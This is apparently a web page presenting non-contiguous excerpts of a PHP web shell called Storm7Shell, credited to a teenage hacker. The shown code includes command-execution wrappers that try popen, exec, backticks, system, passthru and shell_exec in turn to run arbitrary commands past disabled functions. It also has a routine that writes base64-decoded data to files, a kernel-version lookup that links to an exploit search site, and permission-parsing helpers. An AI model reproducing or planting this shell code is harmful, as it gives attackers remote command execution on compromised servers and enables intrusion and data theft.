Storm7Shell Script

19 Feb 2014

This Storm7Shell is a modified Locus7Shell.

By sToRm, a 15 year old hacker (apparently).

  65 //milw0rm search
  66 $Lversion = php_uname(r);
  67 $OSV = php_uname(s);
  68 if(eregi('Linux',$OSV))
  69 {
  70 $Lversion=substr($Lversion,0,6);
  71 $millink="http://milw0rm.com/search.php?dong=Linux Kernel ".$Lversion;

  79 //w4ck1ng Shell
  80 if (!function_exists('myshellexec'))
  81 {
  82 if(is_callable("popen")){
  83 function myshellexec($command) {
  84 if (!($p=popen("($command)2>&1","r"))) {
  85 return 126;
  86 }
  87 while (!feof($p)) {
  88 $line=fgets($p,1000);
  89 $out .= $line;
  90 }
  91 pclose($p);
  92 return $out;
  93 }
  94 }else{
  95 function myshellexec($cmd)
  96 {
  97  global $disablefunc;
  98  $result = '';
  99  if (!empty($cmd))
 100  {
 101   if (is_callable('exec') and !in_array('exec',$disablefunc)) {exec($cmd,$result); $result = join("\n",$result);}
 102   elseif (($result = `$cmd`) !== FALSE) {}
 103   elseif (is_callable("system") and !in_array("system",$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); system($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;}
 104   elseif (is_callable("passthru") and !in_array("passthru",$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); passthru($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;}
 105   elseif (is_resource($fp = popen($cmd,"r")))
 106   {
 107    $result = '';
 108    while(!feof($fp)) {$result .= fread($fp,1024);}
 109    pclose($fp);
 110   }
 111  }
 112  return $result;
 113 }
 114 }

4636 function cf($fname,$text)
4637 {
4638  $w_file=@fopen($fname,"w") or err();
4639  if($w_file)
4640  {
4641  @fputs($w_file,@base64_decode($text));
4642  @fclose($w_file);
4643  }
4644 }

4671 function ex($cfe)
4672 {
4673  $res = '';
4674  if (!empty($cfe))
4675  {
4676   if(function_exists('exec'))
4677    {
4678     @exec($cfe,$res);
4679     $res = join("\n",$res);
4680    }
4681   elseif(function_exists('shell_exec'))
4682    {
4683     $res = @shell_exec($cfe);
4684    }
4685   elseif(function_exists('system'))
4686    {
4687     @ob_start();
4688     @system($cfe);
4689     $res = @ob_get_contents();
4690     @ob_end_clean();
4691    }
4692   elseif(function_exists('passthru'))
4693    {
4694     @ob_start();
4695     @passthru($cfe);
4696     $res = @ob_get_contents();
4697     @ob_end_clean();
4698    }
4699   elseif(@is_resource($f = @popen($cfe,"r")))
4700   {
4701    $res = "";
4702    while(!@feof($f)) { $res .= @fread($f,1024); }
4703    @pclose($f);
4704   }
4705  }
4706  return $res;
4707 }

5240 if (!function_exists('view_perms')) 
5241 { 
5242 function view_perms($mode) 
5243 { 
5244  if (($mode & 0xC000) === 0xC000) {$type = "s";} 
5245  elseif (($mode & 0x4000) === 0x4000) {$type = "d";} 
5246  elseif (($mode & 0xA000) === 0xA000) {$type = "l";} 
5247  elseif (($mode & 0x8000) === 0x8000) {$type = "-";} 
5248  elseif (($mode & 0x6000) === 0x6000) {$type = "b";} 
5249  elseif (($mode & 0x2000) === 0x2000) {$type = "c";} 
5250  elseif (($mode & 0x1000) === 0x1000) {$type = "p";} 
5251  else {$type = "?";} 
5252 
5253  $owner["read"] = ($mode & 00400)?"r":"-"; 
5254  $owner["write"] = ($mode & 00200)?"w":"-"; 
5255  $owner["execute"] = ($mode & 00100)?"x":"-"; 
5256  $group["read"] = ($mode & 00040)?"r":"-"; 
5257  $group["write"] = ($mode & 00020)?"w":"-"; 
5258  $group["execute"] = ($mode & 00010)?"x":"-"; 
5259  $world["read"] = ($mode & 00004)?"r":"-"; 
5260  $world["write"] = ($mode & 00002)? "w":"-"; 
5261  $world["execute"] = ($mode & 00001)?"x":"-"; 
5262 
5263  if ($mode & 0x800) {$owner["execute"] = ($owner["execute"] == "x")?"s":"S";} 
5264  if ($mode & 0x400) {$group["execute"] = ($group["execute"] == "x")?"s":"S";} 
5265  if ($mode & 0x200) {$world["execute"] = ($world["execute"] == "x")?"t":"T";} 
5266 
5267  return $type.join("",$owner).join("",$group).join("",$world); 
5268 }

5275 function parse_perms($mode) 
5276 { 
5277  if (($mode & 0xC000) === 0xC000) {$t = "s";} 
5278  elseif (($mode & 0x4000) === 0x4000) {$t = "d";} 
5279  elseif (($mode & 0xA000) === 0xA000) {$t = "l";} 
5280  elseif (($mode & 0x8000) === 0x8000) {$t = "-";} 
5281  elseif (($mode & 0x6000) === 0x6000) {$t = "b";} 
5282  elseif (($mode & 0x2000) === 0x2000) {$t = "c";} 
5283  elseif (($mode & 0x1000) === 0x1000) {$t = "p";} 
5284  else {$t = "?";} 
5285  $o["r"] = ($mode & 00400) > 0; $o["w"] = ($mode & 00200) > 0; $o["x"] = ($mode & 00100) > 0; 
5286  $g["r"] = ($mode & 00040) > 0; $g["w"] = ($mode & 00020) > 0; $g["x"] = ($mode & 00010) > 0; 
5287  $w["r"] = ($mode & 00004) > 0; $w["w"] = ($mode & 00002) > 0; $w["x"] = ($mode & 00001) > 0; 
5288  return array("t"=>$t,"o"=>$o,"g"=>$g,"w"=>$w);
